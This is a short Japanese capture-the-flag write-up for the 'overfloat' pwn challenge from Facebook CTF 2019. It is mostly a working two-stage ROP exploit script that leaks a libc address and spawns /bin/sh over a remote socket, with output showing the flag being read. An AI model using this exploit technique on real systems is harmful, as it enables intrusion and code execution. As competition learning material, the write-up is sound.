# [pwn 100pts] overfloat - Facebook CTF 2019
64ビットです。
```
$ checksec -f overfloat
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols     No	0		6	overfloat
```

float型の配列にいくらでもいれられるのでStack Overflowがあります。

```python
from ptrlib import *
from struct import pack, unpack

elf = ELF("./overfloat")
libc = ELF("./libc-2.27.so")
#sock = Process("./overfloat")
sock = Socket("challenges.fbctf.com", 1341)

rop_pop_rdi = 0x00400a83
plt_puts = 0x400690

def rop(payload):
    for i in range(0x28 // 8 + 9):
        sock.recvuntil(": ")
        sock.sendline("3.14")
    for i in range(0, len(payload), 4):
        sock.recvuntil(": ")
        sock.sendline(repr(unpack('f', payload[i:i+4])[0]))
    sock.recvuntil(": ")
    sock.sendline("done")

# Stage 1
payload = p64(rop_pop_rdi)
payload += p64(elf.got("printf"))
payload += p64(plt_puts)
payload += p64(elf.symbol("_start"))
rop(payload)
sock.recvuntil("BON VOYAGE!\n")
addr_printf = u64(sock.recvline().rstrip())
libc_base = addr_printf - libc.symbol("printf")
dump("libc base = " + hex(libc_base))

# Stage 2
rop_pop_rax = libc_base + 0x000439c7
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_syscall = libc_base + 0x000013c0

payload = p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
rop(payload)

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to challenges.fbctf.com:1341
[+] dump: `log.dump` is no longer available! Use `logger` instead
[ptrlib]$ BON VOYAGE!
cat /home/overfloat/flag
[ptrlib]$ fb{FloatsArePrettyEasy...}
```

# 感想
最初にfloatのオーバーフローをやったのはKaspersky Industrial CTFでした。
懐かしい。
